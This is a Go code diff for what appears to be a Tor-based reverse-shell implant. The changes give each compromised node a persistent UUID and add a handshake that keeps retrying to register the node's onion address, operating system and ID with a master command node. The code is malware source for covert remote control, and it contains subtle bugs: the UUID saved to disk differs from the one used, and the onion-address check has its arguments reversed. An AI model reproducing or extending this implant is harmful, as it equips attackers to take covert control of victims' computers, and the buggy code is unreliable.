@@ -18,6 +18,8 @@ import (
 	"time"
 
 	"github.com/cretz/bine/tor"
+	"github.com/google/uuid"
+	"github.com/humbertovnavarro/tor-reverse-shell/pkg/os_helpers"
 	"github.com/ipsn/go-libtor"
 	"github.com/joho/godotenv"
 )
@@ -26,6 +28,9 @@ var userDirName string
 
 var masterNode string
 
+var nodeUUID string
+
+// Setup an ephemeral onion service
 var torListenConf = &tor.ListenConf{
 	RemotePorts: []int{80},
 	Version3:    true,
@@ -49,6 +54,33 @@ type TorContext struct {
 	Master     string
 }
 
+func NodeUUID() string {
+	if nodeUUID != "" {
+		return nodeUUID
+	}
+	uuidFilePath := fmt.Sprintf("%s/%s", userDirName, "uuid")
+	exists, err := os_helpers.FileExists(uuidFilePath)
+	if err != nil {
+		panic(err)
+	}
+	if exists {
+		fileData, err := ioutil.ReadFile(uuidFilePath)
+		if err != nil {
+			panic(err)
+		}
+		nodeUUID = string(fileData)
+		return string(fileData)
+	}
+	f, err := os.Create(uuidFilePath)
+	if err != nil {
+		panic(err)
+	}
+	_nodeUUID := uuid.NewString()
+	nodeUUID = _nodeUUID
+	f.WriteString(uuid.NewString())
+	return _nodeUUID
+}
+
 func init() {
 	godotenv.Load()
 	if userDirName == "" {
@@ -57,8 +89,18 @@ func init() {
 	if masterNode == "" {
 		masterNode = os.Getenv("MASTER_NODE")
 	}
+	if userDirName == "" {
+		panic("tor: cannot resolve user dir")
+	}
+	// Skip master check in debug mode
+	if os.Getenv("DEBUG") != "" {
+		return
+	}
 	if !strings.HasPrefix(".onion", masterNode) {
-		log.Fatalf("invalid onion address: %s", masterNode)
+		log.Fatalf("tor: invalid onion address: %s", masterNode)
+	}
+	if masterNode == "" {
+		panic("tor: could not resolve master node")
 	}
 }
 
@@ -79,16 +121,23 @@ func New() (*TorContext, error) {
 	if err != nil {
 		return nil, err
 	}
-	err = Tor.phoneHome()
-	if err != nil {
-		return nil, err
+	// Don't initiate handshake in debug mode
+	if os.Getenv("DEBUG") == "" {
+		for {
+			err = Tor.initiateHandshake()
+			if err == nil {
+				break
+			}
+			fmt.Printf("could not initiate handshake with %s, trying again", masterNode)
+			time.Sleep(time.Second)
+		}
 	}
 	return Tor, nil
 }
 
 func (c *TorContext) newOnionService() error {
 	if c.Tor == nil {
-		return errors.New("the tor service is nil")
+		return errors.New("tor: the tor service is nil")
 	}
 	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
 	defer cancel()
@@ -114,14 +163,16 @@ func (c *TorContext) newHttpClient() error {
 type Handshake struct {
 	Address string `json:"address"`
 	Os      string `json:"os"`
+	UUID    string `json:"id"`
 }
 
 // Let the master node know we exist
-func (c *TorContext) phoneHome() error {
+func (c *TorContext) initiateHandshake() error {
 	address := c.Onion.Addr().String()
 	b, err := json.Marshal(&Handshake{
 		Address: address,
 		Os:      runtime.GOOS,
+		UUID:    nodeUUID,
 	})
 	if err != nil {
 		return err
@@ -133,7 +184,7 @@ func (c *TorContext) phoneHome() error {
 	}
 	b, err = ioutil.ReadAll(resp.Body)
 	if string(b) != "ok" {
-		return errors.New("bad response from master")
+		return errors.New("tor: bad response from master")
 	}
 	if err != nil {
 		return err
